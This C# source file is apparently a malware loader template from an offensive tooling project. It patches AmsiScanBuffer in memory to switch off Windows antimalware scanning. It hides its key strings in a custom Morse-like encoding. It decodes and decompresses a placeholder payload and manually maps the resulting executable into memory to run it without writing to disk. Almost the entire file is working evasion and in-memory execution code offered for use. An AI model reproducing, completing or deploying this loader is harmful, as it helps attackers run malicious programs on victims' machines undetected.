using System;
using System.Runtime.InteropServices;
using System.IO;
using System.IO.Compression;
using Sharperner.Execution;
using Sharperner.Execution.ManMap;
using Sharperner.Execution.DyInvoke;
using System.Threading;
using System.Collections.Generic;
using System.Text;
//using Data = DInvoke.Data;
//using DynamicInvoke = DInvoke.DynamicInvoke;
//using ManualMap = DInvoke.ManualMap;

namespace DInvoke
{
    class AmsiPatch
    {
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);


        public static void Execute()
        {
            try
            {
                Program.InitializeDictionary();

                //Implementation of _RastaMouse's AmsiScanBuffer patch + opcode from @rodzianko

                var b64patchBytes = "^-- -.-. ^.- ^..-. . ^.- ^. ^--.. ..-. .-- ^-..- ..-. / ..- ----- ^.- .-- .-- ...^- ...^- ";
                byte[] patch = Convert.FromBase64String(Program.Receive(b64patchBytes));

                var rahsia = ".- -- ... .. .^. -.. .-.. .-.. ";
                var rahsia2 = "^.- -- ... .. ^... -.-. .- -. ^-... ..- ..-. ..-. . .-. ";

                IntPtr loadLibrary = LoadLibrary(Program.Receive(rahsia));
                IntPtr addressLocation = GetProcAddress(loadLibrary, Program.Receive(rahsia2));

                VirtualProtect(addressLocation, (UIntPtr)patch.Length, 0x40, out uint oldProtect);

                Marshal.Copy(patch, 0, addressLocation, patch.Length);

                VirtualProtect(addressLocation, (UIntPtr)patch.Length, oldProtect, out oldProtect);

                Console.WriteLine("[*] Patched AmsiScanBuffer!");
            }
            catch(Exception e)
            {
                Console.WriteLine("[!]AmsiPatch failed :(!");
            }
        }

    }

    public class Program
    {
        private static Dictionary<char, string> _morseAlphabetDictionary;

        public static void InitializeDictionary()
        {
            _morseAlphabetDictionary = new Dictionary<char, string>()
                                   {
{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},{ '.', ".^." },
                                   };
        }

        public static string Send(string input)
        {
            StringBuilder stringBuilder = new StringBuilder();

            foreach (char character in input)
            {
                if (_morseAlphabetDictionary.ContainsKey(character))
                {
                    stringBuilder.Append(_morseAlphabetDictionary[character] + " ");
                }
                else
                {
                    stringBuilder.Append(character + " ");
                }
            }

            return stringBuilder.ToString();
        }
        public static string Receive(string input)
        {
            StringBuilder stringBuilder = new StringBuilder();

            string[] codes = input.Split(' ');

            foreach (var code in codes)
            {
                foreach (char keyVar in _morseAlphabetDictionary.Keys)
                {
                    if (_morseAlphabetDictionary[keyVar] == code)
                    {
                        stringBuilder.Append(keyVar);
                    }
                }
            }

            return stringBuilder.ToString();
        }

        public static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
            {
                dstream.CopyTo(output);
            }
            return output.ToArray();
        }

        public static byte[] Compress(byte[] data)
        {
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
            {
                dstream.Write(data, 0, data.Length);
            }
            return output.ToArray();
        }

        public static void Main(string[] args)
        {
            /*
               var b64PEBuffer = @"C:\Users\REUSER\source\repos\ObfuscatorXOR\loader\x64\Release\loader.exe";

               var rawByteArray = File.ReadAllBytes(b64PEBuffer);
               var compByteArray = Compress(rawByteArray);
               var b64String = Convert.ToBase64String(compByteArray);

               Console.WriteLine(b64String);
               */

            AmsiPatch.Execute();

            string morsedb64string = "REPLACE MORSECODE HERE";

            InitializeDictionary();

            string b64string = Receive(morsedb64string);

            var bufferByteArray = Convert.FromBase64String(b64string);
            var deCompByteArray = Decompress(bufferByteArray);

            Pencil.PENCIL_MANUAL_MAP MapMap = Peta.MapThisToMemory(deCompByteArray);
            Menyeluruh.PanggilMapPEMod(MapMap.PEINFO, MapMap.ModuleBase);

            //Data.PE.PE_MANUAL_MAP moduleDetails = ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");
            //DynamicInvoke.Generic.CallMappedPEModule(moduleDetails.PEINFO, moduleDetails.ModuleBase);

            Thread.Sleep(Timeout.Infinite);
        }
    }
}